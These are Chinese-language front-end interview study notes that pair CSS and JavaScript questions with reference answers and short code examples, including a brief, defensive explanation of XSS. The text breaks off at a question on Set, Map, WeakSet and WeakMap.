Less 都使用的是标准的 CSS 语法，因此如果可以很方便的将已有的 CSS 代码转为预处理器代码，默认 Sass 使用 .sass 扩展名，而 Less 使用 .less 扩展名。 h1 &#123; color: #0982C1; &#125; 这是一个再普通不过的，不过 Sass 同时也支持老的语法，就是不包含花括号和分号的方式： h1 color: #0982c1 而 Stylus 支持的语法要更多样性一点，它默认使用 .styl 的文件扩展名，下面是 Stylus 支持的语法 /* style.styl */ h1 &#123; color: #0982C1; &#125; /* omit brackets */ h1 color: #0982C1; /* omit colons and semi-colons */ h1 color #0982C1 可以在同一个样式单中使用不同的变量，例如下面的写法也不会报错： h1 &#123; color #0982c1 &#125; h2 font-size: 1.2em 10、行内元素和块级元素什么区别，然后怎么相互转换参考答案: 块级元素 1.总是从新的一行开始，即各个块级元素独占一行，默认垂直向下排列； 2.高度、宽度、margin及padding都是可控的，设置有效，有边距效果； 3.宽度没有设置时，默认为100%； 4.块级元素中可以包含块级元素和行内元素。 行内元素 1.和其他元素都在一行，即行内元素和其他行内元素都会在一条水平线上排列； 2.高度、宽度是不可控的，设置无效，由内容决定。 3.根据标签语义化的理念，行内元素最好只包含行内元素，不包含块级元素。 转换 当然块级元素与行内元素之间的特性是可以相互转换的。HTML可以将元素分为行内元素、块状元素和行内块状元素三种。 使用display属性能够将三者任意转换： (1)display:inline;转换为行内元素； (2)display:block;转换为块状元素； (3)display:inline-block;转换为行内块状元素。 11、样式优先级参考答案： 样式类型 样式类型分为三类 行间 &lt;h1 style=\"font-size:12px;color:#000;\">我的行间CSS样式。&lt;/h1> 内联 &lt;style type=\"text/css\"> h1&#123;font-size:12px; color:#000; &#125; &lt;/style> 外部 &lt;link rel=\"stylesheet\" href=\"css/style.css\"> 选择器类型 1、ID #id 2、class .class 3、标签 p 4、通用 * 5、属性 [type&#x3D;”text”] 6、伪类 :hover 7、伪元素 ::first-line 8、子选择器、相邻选择器 权重计算规则 第一等：代表内联样式，如: style&#x3D;””，权值为1000。第二等：代表ID选择器，如：#content，权值为0100。第三等：代表类，伪类和属性选择器，如.content，权值为0010。第四等：代表类型选择器和伪元素选择器，如div p，权值为0001。通配符、子选择器、相邻选择器等的。如*、&gt;、+,权值为0000。继承的样式没有权值。 比较规则 遵循如下法则： 选择器都有一个权值，权值越大越优先； 当权值相等时，后出现的样式表设置要优于先出现的样式表设置； 创作者的规则高于浏览者：即网页编写者设置的 CSS 样式的优先权高于浏览器所设置的样式； 继承的 CSS 样式不如后来指定的 CSS 样式； 在同一组属性设置中标有!important规则的优先级最大 通配符、子选择器、相邻选择器等的。虽然权值为0000，但是也比继承的样式优先。 ！important !important 的作用是提升优先级，换句话说。加了这句的样式的优先级是最高的（比内联样式的优先级还高)。 &lt;style> p&#123; color:red !important; &#125; &lt;/style> &lt;p style=\"color:blue;\">我显示红色&lt;/p> ie7+和别的浏览器对important的这种作用的支持度都很好。只有ie6有些bug p&#123; color:red !important; color:blue; &#125;//会显示blue 但是这并不说明ie6不支持important，只是支持上有些bug。看下面 p&#123; color:red !important; &#125; p&#123; color:blue; &#125; //这样就会显示的是red。说明ie6还是支持important的。&lt;/pre> 12、盒子塌陷是什么？参考答案： 盒子塌陷 本应该在父盒子内部的元素跑到了外部。 原因： 当父元素没设置足够大小的时候，而子元素设置了浮动的属性，子元素就会跳出父元素的边界（脱离文档流），尤其是当父元素的高度为auto时，而父元素中又没有其它非浮动的可见元素时，父盒子的高度就会直接塌陷为零， 我们称这是CSS高度塌陷。 关于盒子塌陷的几种解决方法 （1）最简单，直接，粗暴的方法就是盒子大小写死，给每个盒子设定固定的width和height，直到合适为止，这样的好处是简单方便，兼容性好，适合只改动少量内容不涉及盒子排布的版面。缺点是非自适应，浏览器的窗口大小直接影响用户体验。 （2）给外部的父盒子也添加浮动，让其也脱离标准文档流，这种方法方便，但是对页面的布局不是很友好，不易维护。 （3）给父盒子添加overflow属性。 overflow:auto; 有可能出现滚动条，影响美观。 overflow:hidden; 可能会带来内容不可见的问题。 （4）父盒子里最下方引入清除浮动块。最简单的有： &lt;br style=\"clear:both;\"/> 有很多人是这么解决的，但是我们并不推荐，因为其引入了不必要的冗余元素 。 (5)用after伪元素清除浮动 给外部盒子的after伪元素设置clear属性，再隐藏它 这其实是对空盒子方案的改进，一种纯CSS的解决方案，不用引入冗余元素。 .clearfix &#123;*zoom: 1;&#125; .clearfix:before,.clearfix:after &#123; display: table; line-height: 0; content: \"\"; &#125; .clearfix:after &#123;clear: both;&#125; 这也是bootstrap框架采用的清除浮动的方法。 这是一种纯CSS的解决浮动造成盒子塌陷方法，没有引入任何冗余元素，推荐使用此方法来解决CSS盒子塌陷。 备注：第五种方法虽好，但是低版本IE不兼容，具体选择哪种解决方法，可根据实际情况决定。 (6) 给父盒子添加border (7) 给父盒子设置padding-top 13、css 伪类与伪元素区别参考答案： 伪类(pseudo-classes) 其核⼼就是⽤来选择DOM树之外的信息,不能够被普通选择器选择的⽂档之外的元素，⽤来添加⼀些选择器的特殊效果。 ⽐如:hover :active :visited :link :visited :first-child :focus :lang等 由于状态的变化是⾮静态的，所以元素达到⼀个特定状态时，它可能得到⼀个伪类的样式；当状态改变时，它⼜会失去这个样式。 由此可以看出，它的功能和class有些类似，但它是基于⽂档之外的抽象，所以叫 伪类。 伪元素(Pseudo-elements) DOM树没有定义的虚拟元素 核⼼就是需要创建通常不存在于⽂档中的元素， ⽐如::before ::after 它选择的是元素指定内容，表示选择元素内容的之前内容或之后内容。 伪元素控制的内容和元素是没有差别的，但是它本身只是基于元素的抽象，并不存在于⽂档中，所以称为伪元素。⽤于将特殊的效果添加到某些选择器 伪类与伪元素的区别 表示⽅法 CSS2 中伪类、伪元素都是以单冒号:表示, CSS2.1 后规定伪类⽤单冒号表示,伪元素⽤双冒号::表示， 浏览器同样接受 CSS2 时代已经存在的伪元素(:before, :after, :first�line, :first-letter 等)的单冒号写法。 CSS2 之后所有新增的伪元素(如::selection)，应该采⽤双冒号的写法。 CSS3中，伪类与伪元素在语法上也有所区别，伪元素修改为以::开头。浏览器对以:开头的伪元素也继续⽀持，但建议规范书写为::开头 定义不同 伪类即假的类，可以添加类来达到效果 伪元素即假元素，需要通过添加元素才能达到效果 总结: 伪类和伪元素都是⽤来表示⽂档树以外的”元素”。 伪类和伪元素分别⽤单冒号:和双冒号::来表示。 伪类和伪元素的区别，关键点在于如果没有伪元素(或伪类)， 是否需要添加元素才能达到效果，如果是则是伪元素，反之则是伪类 伪类和伪元素都不出现在源⽂件和DOM树中。也就是说在html源⽂件中是看不到伪类和伪元素的。 伪类其实就是基于普通DOM元素⽽产⽣的不同状态，他是DOM元素的某⼀特征。 伪元素能够创建在DOM树中不存在的抽象对象，⽽且这些抽象对象是能够访问到的。 14、行内元素的margin 和 padding参考答案： 水平方向：水平方向上，都有效； 垂直方向：垂直方向上，都无效；（padding-top 和 padding-bottom 会显示出效果，但是高度不会撑开，不会对周围元素有影响） 15、min-width&#x2F;max-width 和 min-height&#x2F;max-height 属性间的覆盖规则？参考答案： max-width 会覆盖 width，即使 width 是行内样式或者设置了 !important。 min-width 会覆盖 max-width，此规则发生在 min-width 和 max-width 冲突的时候； 16、未知高度元素垂直居中、水平居中的实现方式有哪些？参考答案： 1、绝对定位+css3 transform:translate(-50%，-50%) .wrap&#123; position:relative; &#125; .child&#123; position: absolute; top:50%; left:50%; -webkit-transform:translate(-50%,-50%); &#125; 2、css3 的flex布局 .wrap&#123; display:flex; justify-content:center; &#125; .child&#123; align-self:center; &#125; 3、table布局 &lt;div class=\"wrap\"> &lt;div class=\"child\"> &lt;div>sadgsdgasgd&lt;/div> &lt;/div> &lt;/div> .wrap&#123; display:table; text-align:center; &#125; .child&#123; background:#ccc; display:table-cell; vertical-align:middle; &#125; .child div&#123; width:300px; height:150px; background:red; margin:0 auto; &#125; Javascript1、JS中的instanceof运算符instanceof运算符用来判断一个构造函数的prototype属性所指向的对象是否存在另外一个要检测对象的原型链上 obj instanceof Object;&#x2F;&#x2F;true 实例obj在不在Object构造函数中 eg： 请补全JavaScript函数，要求以Boolean的形式返回第一个参数是否属于第二个参数对象的实例。 function _instanceof(left,right) &#123; &#x2F;&#x2F; 补全代码 return (left instanceof right ) &#125; 2、排序sort() 方法对数组的项目进行排序。 按升序对数组中的数字进行排序： var points &#x3D; [40, 100, 1, 5, 25, 10]; points.sort(function(a, b)&#123;return a-b&#125;); 按降序对数组中的数字进行排序： var points &#x3D; [40, 100, 1, 5, 25, 10]; points.sort(function(a, b)&#123;return b-a&#125;); 3、JS字符串大写和小写之间的转换String 字符串大小写转换方法 字符串方法 说明 toLocaleLowerCase() 把字符串转换成小写 toLocaleUpperCase() 将字符串转换成大写 toLowerCase() 将字符串转换成小写 toUpperCase() 将字符串转换成大写 var s = \"JavaScript\"; console.log(s.toUpperCase()); 4、javascript如何删除指定数组元素 使用delete关键字； var colors &#x3D; [&quot;red&quot;, &quot;blue&quot;, &quot;grey&quot;, &quot;green&quot;]; delete colors[0]; console.log(colors); &#x2F;&#x2F; [undefined, &quot;blue&quot;, &quot;grey&quot;, &quot;green&quot;] 使用delete删除元素之后数组长度不变，只是被删除元素被置为undefined了 使用splice()操作方法； var colors &#x3D; [&quot;red&quot;, &quot;blue&quot;, &quot;grey&quot;]; var color &#x3D; colors.splice(0, 1); console.log(color); &#x2F;&#x2F; &quot;red&quot; console.log(colors); &#x2F;&#x2F; [&quot;blue&quot;, &quot;grey&quot;] 在删除数组元素的时候，它可以删除任意数量的项，只需要指定2个参数：要删除的第一项的位置和要删除的项数。 迭代方法，用循环迭代数组元素，发现符合要删除的项则删除； 第一种用最常见的ForEach循环来对比元素找到之后将其删除。 var colors &#x3D; [&quot;red&quot;, &quot;blue&quot;, &quot;grey&quot;]; colors.forEach(function(item, index, arr) &#123; if(item &#x3D;&#x3D;&#x3D; &quot;red&quot;) &#123; arr.splice(index, 1); &#125; &#125;) var colors &#x3D; [&quot;red&quot;, &quot;blue&quot;, &quot;grey&quot;]; colors &#x3D; colors.filter(function(item) &#123; return item !&#x3D; &quot;red&quot;&#125;); console.log(colors); &#x2F;&#x2F; [&quot;blue&quot;, &quot;grey&quot;] prototype原型方法，在Array的原型上添加方法来达到删除的目的。 5、数组方法数组方法概括 方法名 对应版本 功能 原数组是否改变 concat() ES5- 合并数组，并返回合并之后的数据 n join() ES5- 使用分隔符，将数组转为字符串并返回 n pop() ES5- 删除最后一位，并返回删除的数据 y shift() ES5- 删除第一位，并返回删除的数据 y unshift() ES5- 在第一位新增一或多个数据，返回长度 y push() ES5- 在最后一位新增一或多个数据，返回长度 y reverse() ES5- 反转数组，返回结果 y slice() ES5- 截取指定位置的数组，并返回 n sort() ES5- 排序（字符规则），返回结果 y splice() ES5- 删除指定位置，并替换，返回删除的数据 y toString() ES5- 直接转为字符串，并返回 n valueOf() ES5- 返回数组对象的原始值 n indexOf() ES5 查询并返回数据的索引 n lastIndexOf() ES5 反向查询并返回数据的索引 n forEach() ES5 参数为回调函数，会遍历数组所有的项，回调函数接受三个参数，分别为value，index，self；forEach没有返回值 n map() ES5 同forEach，同时回调函数返回数据，组成新数组由map返回 n filter() ES5 同forEach，同时回调函数返回布尔值，为true的数据组成新数组由filter返回 n every() ES5 同forEach，同时回调函数返回布尔值，全部为true，由every返回true n some() ES5 同forEach，同时回调函数返回布尔值，只要由一个为true，由some返回true n reduce() ES5 归并，同forEach，迭代数组的所有项，并构建一个最终值，由reduce返回 n reduceRight() ES5 反向归并，同forEach，迭代数组的所有项，并构建一个最终值，由reduceRight返回 n 用slice(0)复制一个数组 a.splice(index,0,item)：在数组a的第index位置插入item 最大值 ;Math.max.apply(Math,array) 6、对象Number 对象Number 对象是原始数值的包装对象，创建 Number 对象的语法格式如下： var myNum &#x3D; new Number(value); var myNum &#x3D; Number(value); 其中 value 为要创建的 Number 对象的数值，若 value 为一个非数字的值，则会尝试将其转换为数字，若转换失败则会返回 NaN。 eg:请补全JavaScript函数，要求将数字参数转换为对象的形式返回。 function _numbertoobject(number) &#123; &#x2F;&#x2F; 补全代码 var myNum &#x3D; new Number(number); return myNum &#125; 对象字符串JavaScript String 对象用于处理字符串，其中提供了大量操作字符串的方法，以及一些属性。 创建 String 对象的语法格式如下： var val &#x3D; new String(value); var val &#x3D; String(value); 对象属性遍历： 使用 for in 循环遍历对象的属性时，原型链上的所有属性都将被访问： var obj=&#123;\"name\":\"wjy\",\"age\":26,\"sex\":\"female\"&#125;;//定义一个object对象 var keys=[];//定义一个数组用来接受key var values=[];//定义一个数组用来接受value for(var key in obj)&#123; keys.push(key); values.push(obj[key]);//取得value &#125; alert(\"keys is ：\"+keys+\" and values is ：\"+values); Object.keys(xx)&#x2F;Object.values(xx) console.log(Object.keys(obj)); console.log(Object.values(obj)); //输出：[\"name\", \"career\"] //输出：[ \"Poly\", \"it\"] 添加属性//创建obj对象 var obj = new Object(); //为对象添加动态属性 obj.userName = \"admin\"; obj.passWord = \"123456\"; //输出 console.log(obj); 删除对象属性//创建obj动态对象 var obj = new Object(); //为对象添加动态属性 obj.userName = \"admin\"; obj.passWord = \"123456\"; //移除属性 delete obj.passWord; console.log(obj); 7、字符串String 对象中的方法下表中列举了 String 对象中提供的方法及其描述信息： 方法 描述 anchor() 创建一个 HTML 锚点，即生成一个&lt;a&gt;标签，标签的 name 属性为 anchor() 方法中的参数 big() 用大号字体显示字符串 blink() 显示闪动的字符串 bold() 使用粗体显示字符串 charAt() 返回在指定位置的字符 charCodeAt() 返回指定字符的 Unicode 编码 concat() 拼接字符串 fixed() 以打字机文本显示字符串 fontcolor() 使用指定的颜色来显示字符串 fontsize() 使用指定的尺寸来显示字符串 fromCharCode() 将字符编码转换为一个字符串 indexOf() 检索字符串，获取给定字符串在字符串对象中首次出现的位置 italics() 使用斜体显示字符串 lastIndexOf() 获取给定字符串在字符串对象中最后出现的位置 link() 将字符串显示为链接 localeCompare() 返回一个数字，并使用该数字来表示字符串对象是大于、小于还是等于给定字符串 match() 根据正则表达式匹配字符串中的字符 replace() 替换与正则表达式匹配的子字符串 search() 获取与正则表达式相匹配字符串首次出现的位置 slice() 截取字符串的片断，并将其返回 small() 使用小字号来显示字符串 split() 根据给定字符将字符串分割为字符串数组 strike() 使用删除线来显示字符串 sub() 把字符串显示为下标 substr() 从指定索引位置截取指定长度的字符串 substring() 截取字符串中两个指定的索引之间的字符 sup() 把字符串显示为上标 toLocaleLowerCase() 把字符串转换为小写 toLocaleUpperCase() 把字符串转换为大写 toLowerCase() 把字符串转换为小写 toUpperCase() 把字符串转换为大写 toString() 返回字符串 valueOf() 返回某个字符串对象的原始值 去除字符串左右两边的空格let str = \" 123 \"; str=str.trim(); // 123 8、js 时间与时间戳的转换时间转时间戳：javascript获得时间戳的方法有四种，都是通过实例化时间对象 new Date() 来进一步获取当前的时间戳 var timetamp4 &#x3D; Number(new Date()) 时间戳转时间function _date(number) &#123; let date &#x3D; new Date(number); let y &#x3D; date.getFullYear(); let m &#x3D; date.getMonth()+1; let d &#x3D; date.getDate(); return (y + &quot;-&quot; + m + &quot;-&quot; + d); &#125; 9、Arguments 对象arguments 是一个对应于传递给函数的参数的类数组对象。 function func1(a, b, c) &#123; console.log(arguments[0]); &#x2F;&#x2F; expected output: 1 console.log(arguments[1]); &#x2F;&#x2F; expected output: 2 console.log(arguments[2]); &#x2F;&#x2F; expected output: 3 &#125; func1(1, 2, 3); 10、Document 对象Document 对象属性和方法HTML文档中可以使用以下属性和方法: 属性 &#x2F; 方法 描述 document.activeElement 返回当前获取焦点元素 document.addEventListener() 向文档添加句柄 document.adoptNode(node) 从另外一个文档返回 adapded 节点到当前文档。 document.anchors 返回对文档中所有 Anchor 对象的引用。 document.applets 返回对文档中所有 Applet 对象的引用。注意: HTML5 已不支持 元素。 document.baseURI 返回文档的绝对基础 URI document.body 返回文档的body元素 document.close() 关闭用 document.open() 方法打开的输出流，并显示选定的数据。 document.cookie 设置或返回与当前文档有关的所有 cookie。 document.createAttribute() 创建一个属性节点 document.createComment() createComment() 方法可创建注释节点。 document.createDocumentFragment() 创建空的 DocumentFragment 对象，并返回此对象。 document.createElement() 创建元素节点。 document.createTextNode() 创建文本节点。 document.doctype 返回与文档相关的文档类型声明 (DTD)。 document.documentElement 返回文档的根节点 document.documentMode 返回用于通过浏览器渲染文档的模式 document.documentURI 设置或返回文档的位置 document.domain 返回当前文档的域名。 document.domConfig 已废弃。返回 normalizeDocument() 被调用时所使用的配置。 document.embeds 返回文档中所有嵌入的内容（embed）集合 document.forms 返回对文档中所有 Form 对象引用。 document.getElementsByClassName() 返回文档中所有指定类名的元素集合，作为 NodeList 对象。 document.getElementById() 返回对拥有指定 id 的第一个对象的引用。 document.getElementsByName() 返回带有指定名称的对象集合。 document.getElementsByTagName() 返回带有指定标签名的对象集合。 document.images 返回对文档中所有 Image 对象引用。 document.implementation 返回处理该文档的 DOMImplementation 对象。 document.importNode() 把一个节点从另一个文档复制到该文档以便应用。 document.inputEncoding 返回用于文档的编码方式（在解析时）。 document.lastModified 返回文档被最后修改的日期和时间。 document.links 返回对文档中所有 Area 和 Link 对象引用。 document.normalize() 删除空文本节点，并连接相邻节点 document.normalizeDocument() 删除空文本节点，并连接相邻节点的 document.open() 打开一个流，以收集来自任何 document.write() 或 document.writeln() 方法的输出。 document.querySelector() 返回文档中匹配指定的CSS选择器的第一元素 document.querySelectorAll() document.querySelectorAll() 是 HTML5中引入的新方法，返回文档中匹配的CSS选择器的所有元素节点列表 document.readyState 返回文档状态 (载入中……) document.referrer 返回载入当前文档的文档的 URL。 document.removeEventListener() 移除文档中的事件句柄(由 addEventListener() 方法添加) document.renameNode() 重命名元素或者属性节点。 document.scripts 返回页面中所有脚本的集合。 document.strictErrorChecking 设置或返回是否强制进行错误检查。 document.title 返回当前文档的标题。 document.URL 返回文档完整的URL document.write() 向文档写 HTML 表达式 或 JavaScript 代码。 document.writeln() 等同于 write() 方法，不同的是在每个表达式之后写一个换行符。 11、JS中阻止冒泡事件冒泡事件：比如说鼠标点击了一个按钮，同样的事件将会在那个元素的所有祖先元素中被触发。这一过程被称为事件冒泡。 &lt;div class=\"box\"> &lt;button class=\"btn\">按钮&lt;/button> &lt;/div> &lt;script type=\"text/javascript\"> $('.btn').click(function () &#123; alert('按钮被点击了') &#125;); $('.box').click(function () &#123; alert('box被点击了') &#125;) &lt;/script> 当我们点击按钮后，因为按钮也属于.box元素，所以按钮的父元素.box也会触发点击事件 $('.btn').click(function (even) &#123; even.stopPropagation(); alert('按钮被点击了'); &#125;) 12、阻止默认事件&lt;a href&#x3D;&quot;javascript:;&quot;&gt;链接&lt;&#x2F;a&gt; &lt;a href&#x3D;&quot;javascript:void(0);&quot;&gt;链接&lt;&#x2F;a&gt; &lt;a href&#x3D;&quot;&quot; id&#x3D;&quot;link&quot;&gt;链接&lt;&#x2F;a&gt; &lt;script&gt; document.getElementById(&quot;link&quot;).onclick &#x3D; function ()&#123; console.log(&quot;666&quot;); return false; &#125; &lt;&#x2F;script&gt; &lt;a href&#x3D;&quot;&quot; id&#x3D;&quot;link&quot;&gt;链接&lt;&#x2F;a&gt; &lt;script&gt; document.getElementById(&quot;link&quot;).onclick &#x3D; function (e)&#123; console.log(&quot;666&quot;); e.preventDefault(); &#125; &lt;&#x2F;script&gt; 13、window.locationLocation 对象属性 属性 描述 hash 设置或返回从井号 (#) 开始的 URL（锚）。 host 设置或返回主机名和当前 URL 的端口号。 hostname 设置或返回当前 URL 的主机名。 href 设置或返回完整的 URL。 pathname 设置或返回当前 URL 的路径部分。 port 设置或返回当前 URL 的端口号。 protocol 设置或返回当前 URL 的协议。 search 设置或返回从问号 (?) 开始的 URL（查询部分）。 Location 对象方法 属性 描述 assign() 加载新的文档。 reload() 重新加载当前文档。 replace() 用新的文档替换当前文档。 14、原型与原型链原型 prototype原型是函数特有 &lt;script> function fu()&#123; &#125; fu.prototype.name = 'kif' console.log(fu.prototype.name) &lt;/script> 挂载在原型上是为了继承(通过new) 继承后查找时就近， 判断属性时继承的还是后天添加的：hasOwnProperty 可以拿到p1的私有属性 这个方法既不是Persion也不是p1的，而是Persion继承自Object的 原型链：_proto_对象，数组，函数等有原型链 预编译function fn(a,c)&#123; console.log(a) var a =123; console.log(a) console.log(c) function a()&#123;&#125; if(false)&#123; var d =678 &#125; console.log(d) console.log(b) var b =function()&#123;&#125; console.log(b) function c()&#123;&#125; console.log(c) &#125; fn(2,3) 预编译步骤： 创建AO对象 AO：&#123; &#125; 找形参和变量声明 AO：&#123; a:undefind c:undefind d:undefind bLundefind &#125; 实参与形参相统一 AO：&#123; a:2 c:3 d:undefind b:undefind &#125; 找函数申明（会覆盖变量） AO：&#123; a:function a()&#123;&#125; c:function c()&#123;&#125; d:undefind b:undefind &#125; 注:var b &#x3D;function(){}不是函数声明 逐行执行 function fn(a,c)&#123; console.log(a)&#x2F;&#x2F;function a()&#123;&#125; var a &#x3D;123; console.log(a)&#x2F;&#x2F;123 console.log(c)&#x2F;&#x2F;function c()&#123;&#125; function a()&#123;&#125; if(false)&#123; var d &#x3D;678 &#125; console.log(d)&#x2F;&#x2F;undefind console.log(b)&#x2F;&#x2F;undefind var b &#x3D;function()&#123;&#125; console.log(b)&#x2F;&#x2F;function()&#123;&#125; function c()&#123;&#125; console.log(c)&#x2F;&#x2F;function c()&#123;&#125; &#125; fn(2,3) 15、this函数直接调用function get(a)&#123; console.log(a) &#125; get(&#39;kif&#39;) 其中 get(‘kif’) 其实是get.call(window,’kif’ ) 即：对象.方法.call(对象，参数) 对象方法var Persion = &#123; name: 'kif', getName: function (time) &#123; console.log(this.name,time) &#125; &#125; Persion.getName(299) 同理： Persion.getName(299)为：Persion.getName.call(Persion,299) 案例：var name = 222 var a=&#123; name :111, say:function()&#123; console.log(this.name) &#125; &#125; var fun = a.say fun()//fun.call(window,)======>222 a.say()//a.say.call(a,)=======>111 var b =&#123; name:333, say:function(fun)&#123; fun()//fun.call(window,)//222 &#125; &#125; b.say(a.say)// b.say=a.say b.say()//b.say.call(b,)=======>333 箭头函数中thisvar x =11 var p =&#123; x:22, say:()=>&#123; console.log(this.x) &#125; &#125; p.say() 箭头函数中this固定指向代码块外部 this指向（普通函数、箭头函数）参考答案： 普通函数中的this 谁调用了函数或者方法，那么这个函数或者对象中的this就指向谁 let getThis = function () &#123; console.log(this); &#125; let obj=&#123; name:\"Jack\", getThis:function()&#123; console.log(this); &#125; &#125; //getThis()方法是由window在全局作用域中调用的，所以this指向调用该方法的对象，即window getThis();//window //此处的getThis()方法是obj这个对象调用的，所以this指向obj obj.getThis();//obj 匿名函数中的this：匿名函数的执行具有全局性，则匿名函数中的this指向是window，而不是调用该匿名函数的对象； let obj = &#123; getThis: function () &#123; return function () &#123; console.log(this); &#125; &#125; &#125; obj.getThis()(); //window 上面代码中，getThi()方法是由obj调用，但是obj.getThis()返回的是一个匿名函数，而匿名函数中的this指向window，所以打印出window。 如果想在上述代码中使this指向调用该方法的对象，可以提前把this传值给另外一个变量(_this或者that)： let obj = &#123; getThis: function () &#123; //提前保存this指向 let _this=this return function () &#123; console.log(_this); &#125; &#125; &#125; obj.getThis()(); //obj 箭头函数中的this 箭头函数中的this是在函数定义的时候就确定下来的，而不是在函数调用的时候确定的； 箭头函数中的this指向父级作用域的执行上下文；（技巧：因为javascript中除了全局作用域，其他作用域都是由函数创建出来的，所以如果想确定this的指向，则找到离箭头函数最近的function，与该function平级的执行上下文中的this即是箭头函数中的this） 箭头函数无法使用apply、call和bind方法改变this指向，因为其this值在函数定义的时候就被确定下来。 例1：首先，距离箭头函数最近的是getThis(){}，与该函数平级的执行上下文是obj中的执行上下文，箭头函数中的this就是下注释代码处的this，即obj。 let obj = &#123; //此处的this即是箭头函数中的this getThis: function () &#123; return ()=> &#123; console.log(this); &#125; &#125; &#125; obj.getThis()(); //obj 例2：该段代码中存在两个箭头函数，this找不到对应的function(){}，所以一直往上找直到指向window。 复制代码 //代码中有两个箭头函数，由于找不到对应的function，所以this会指向window对象。 let obj = &#123; getThis: ()=> &#123; return ()=> &#123; console.log(this); &#125; &#125; &#125; obj.getThis()(); //window 16、闭包形式：方法里面返回一个方法 function a() &#123; let a = 1; return function () &#123; return a; &#125;; &#125; 意义： 延长变量生命周期 创建私有环境 Vue中data也是一个闭包 data（）&#123; return&#123; &#125; &#125; 会常驻内存，所以慎用 17、ES6var let constvar: 变量提升 console.log(a)//undefined var a = 12 变量覆盖 var a =12 var a =23 console.log(a)//23 没有块级作用域 function fu()&#123; for(var i=0;i&lt;3;i++)&#123; console.log(i) &#125; console.log(i)//3 &#125; const: const声明之后必须赋值 const定义数组，可以对数组修改 const arr = [\"sad\", \"666\", \"qewqe\"]; arr.push('5465') console.log(arr) 解构let a&#x3D;1; let b &#x3D;2; 不使用第三个变量互换值 [a,b]&#x3D;[b,a] 去重let arr=[1,2,3,4,5,2,3,4,2] let ans = [...new Set(arr)] console.log(ans) promiselet p = new Promise((resolve, reject) => &#123; console.log(1) resolve() console.log(2) &#125;) p.then(() => &#123; console.log(3) &#125;) console.log(4) 构造函数同步执行 &#x2F;&#x2F;1,2 异步函数异步执行 &#x2F;&#x2F;4,3 18、xssxss（cross-site-scripting）攻击指的是攻击者往 web 页面里插入恶意 html 标签或者 javascript 代码 ；首先代码里对用户输入的地方和变量都需要仔细检查长度和对 “&lt;&gt; , ; . ”等字进行过滤；其次任何内容写到页面之前都必须加 encode，避免不小心把 html tag 弄出来。这一个层面做好，至少可以堵住超过一半的XSS 攻击 ；攻击者在论坛中放一个看似安全的链接，骗取用户点击后，窃取 cookie 中的用户私密信息；或者攻击者在论坛中加一个恶意表单，当用户提交表单的时候，却把信息传送到攻击者的服务器汇总，而不是用户原本以为的信任站点 ； 19、SEOSEO： Search Engine Optimization, 搜索引擎优化。利用搜索引擎的规则提高网站在有关搜索引擎内的自然排名。目的是让其在行业内占据领先地位，获得品牌收益。很大程度上是网站经营者的一种商业行为，将自己或自己公司的排名前移。SEO是提高你网站排名的一个很有效的方法，这个完善和优化你网站的排名因素的方法就是能影响搜索引擎的排名的算法。 因此，SEO是网络营销策略 （online marketing Digital strategy）和数字营销策略 （Digital Marketing strategy）中很重要的一个环节。SEO使你的网站获取得更多的流量（traffic）同时也可以提高你在搜索引擎的排名。那就意味你可以获取得更多的订单，更多的利润。 20、数组去重ES6： let arr = [12, 12, 3, 2, 23, 23, 4, 3, 2]; function unique(arr) &#123; return Array.from(new Set(arr)); &#125; console.log(unique(arr)); let arr = [12, 12, 34, 21, 34, 21, 5, 2, 5]; function unique(arr) &#123; return [...new Set(arr)]; &#125; console.log(unique(arr)); ES5： let arr = [12, 12, 3, 4, 4, 3, 5, 23, 12, 3]; function unique(arr) &#123; let Newarr = []; for (let i = 0; i &lt; arr.length; i++) &#123; if (Newarr.indexOf(arr[i]) == -1) &#123; Newarr.push(arr[i]); &#125; &#125; return Newarr; &#125; console.log(unique(arr)); 21、数组和伪数组的区别 定义 数组是一个特殊对象,与常规对象的区别： 当由新元素添加到列表中时，自动更新length属性 设置length属性，可以截断数组 从Array.protoype中继承了方法 属性为’Array’ 类数组是一个拥有length属性，并且他属性为非负整数的普通对象，类数组不能直接调用数组方法。 区别本质：类数组是简单对象，它的原型关系与数组不同。 // 原型关系和原始值转换 let arrayLike = &#123; length: 10, &#125;; console.log(arrayLike instanceof Array); // false console.log(arrayLike.__proto__.constructor === Array); // false console.log(arrayLike.toString()); // [object Object] console.log(arrayLike.valueOf()); // &#123;length: 10&#125; let array = []; console.log(array instanceof Array); // true console.log(array.__proto__.constructor === Array); // true console.log(array.toString()); // '' console.log(array.valueOf()); // [] 类数组转换为数组 转换方法 使用 Array.from() 使用 Array.prototype.slice.call() 使用 Array.prototype.forEach() 进行属性遍历并组成新的数组 转换须知 转换后的数组长度由 length 属性决定。索引不连续时转换结果是连续的，会自动补位。 代码示例 let al1 = &#123; length: 4, 0: 0, 1: 1, 3: 3, 4: 4, 5: 5, &#125;; console.log(Array.from(al1)) // [0, 1, undefined, 3] ②仅考虑 0或正整数 的索引 // 代码示例 let al2 = &#123; length: 4, '-1': -1, '0': 0, a: 'a', 1: 1 &#125;; console.log(Array.from(al2)); // [0, 1, undefined, undefined] ③使用slice转换产生稀疏数组 // 代码示例 let al2 = &#123; length: 4, '-1': -1, '0': 0, a: 'a', 1: 1 &#125;; console.log(Array.prototype.slice.call(al2)); //[0, 1, empty × 2] 使用数组方法操作类数组注意地方 复制代码 let arrayLike2 = &#123; 2: 3, 3: 4, length: 2, push: Array.prototype.push &#125; // push 操作的是索引值为 length 的位置 arrayLike2.push(1); console.log(arrayLike2); // &#123;2: 1, 3: 4, length: 3, push: ƒ&#125; arrayLike2.push(2); console.log(arrayLike2); // &#123;2: 1, 3: 2, length: 4, push: ƒ&#125; 22、手写一个发布订阅// 发布订阅中心, on-订阅, off取消订阅, emit发布, 内部需要一个单独事件中心caches进行存储; interface CacheProps &#123; [key: string]: Array&lt;((data?: unknown) => void)>; &#125; class Observer &#123; private caches: CacheProps = &#123;&#125;; // 事件中心 on (eventName: string, fn: (data?: unknown) => void)&#123; // eventName事件名-独一无二, fn订阅后执行的自定义行为 this.caches[eventName] = this.caches[eventName] || []; this.caches[eventName].push(fn); &#125; emit (eventName: string, data?: unknown) &#123; // 发布 => 将订阅的事件进行统一执行 if (this.caches[eventName]) &#123; this.caches[eventName].forEach((fn: (data?: unknown) => void) => fn(data)); &#125; &#125; off (eventName: string, fn?: (data?: unknown) => void) &#123; // 取消订阅 => 若fn不传, 直接取消该事件所有订阅信息 if (this.caches[eventName]) &#123; const newCaches = fn ? this.caches[eventName].filter(e => e !== fn) : []; this.caches[eventName] = newCaches; &#125; &#125; &#125; 23、介绍下 Set、Map、WeakSet 和 WeakMap 